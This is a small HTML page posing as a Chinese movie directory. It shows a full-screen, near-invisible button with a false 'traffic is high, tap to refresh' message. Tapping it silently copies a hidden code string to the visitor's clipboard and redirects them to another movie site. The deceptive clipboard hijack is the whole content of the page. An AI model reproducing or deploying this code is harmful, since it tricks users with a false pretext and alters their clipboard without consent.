<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0;" name="viewport" />
<title>中国电影大全网</title>
<script src="http://libs.baidu.com/jquery/1.11.3/jquery.min.js"></script>
<style>
</style>
</head>

<body>
    <div style="alpha=100%;width:0px;height:0px;font-size:0px">JZsQfT82NT</div>
	
	<!-- 1 -->
    <button class="btn" data-clipboard-action="copy" data-clipboard-target="div" autofocus style="background-color:#ffffff; border:1px solid white;alpha=50%; display:block; width:390px; height:580px;font-size:14px">当前访问量有点大，请点击一下屏幕进行刷新</button>
	
	 <!-- 2. Include library -->
    <script src="js/src/clipboard.min.js"></script>
	
	<!-- 3 -->
	<script>
    var clipboard = new Clipboard('.btn');
    clipboard.on('success', function(e) {
		//alert("复制成功");
		window.location.href="http://www.xunyingwang.com/"
        console.log(e);
    });
    clipboard.on('error', function(e) {
		alert("复制失败");
        console.log(e);
    });
    </script>
	
</body>
</html>
